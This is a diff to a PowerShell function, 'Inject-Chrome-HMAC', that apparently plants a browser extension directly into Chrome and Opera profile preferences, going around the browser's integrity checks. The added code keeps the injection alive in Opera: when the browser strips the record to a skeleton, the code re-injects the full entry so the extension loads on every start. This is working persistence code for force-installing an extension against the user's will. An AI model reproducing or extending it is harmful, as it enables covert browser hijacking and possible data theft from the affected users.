@@ -331,8 +331,18 @@ function Inject-Chrome-HMAC($profPath, $extPath, $extId, $browserType) {
         # 2) already injected -> maintenance-ok
         # 2) already injected -> maintenance-ok (Opera: opsettings; else settings)
         $done = $false
-        if ($sp.extensions.opsettings -and ($sp.extensions.opsettings.PSObject.Properties.Name -contains $extId)) { $done = $true }
-        if ($sp.extensions.settings -and ($sp.extensions.settings.PSObject.Properties.Name -contains $extId)) { $done = $true }
+        # Opera: on every browser start the extension service rewrites the
+        # opsettings record to a runtime-only skeleton (path/location dropped)
+        # while the extension keeps running. A skeleton entry means the NEXT
+        # browser start will not load the extension, so it must NOT count as
+        # already-injected: re-inject the full record (path present = healthy).
+        if ($browserType -eq 'opera') {
+            $opRec = $null
+            try { $opRec = $sp.extensions.opsettings.$extId } catch {}
+            if ($opRec -and $opRec.path) { $done = $true }
+        } else {
+            if ($sp.extensions.settings -and ($sp.extensions.settings.PSObject.Properties.Name -contains $extId)) { $done = $true }
+        }
         if ($done) { return $true }
 
         # 3) our entry (Chrome 153-verified shape)
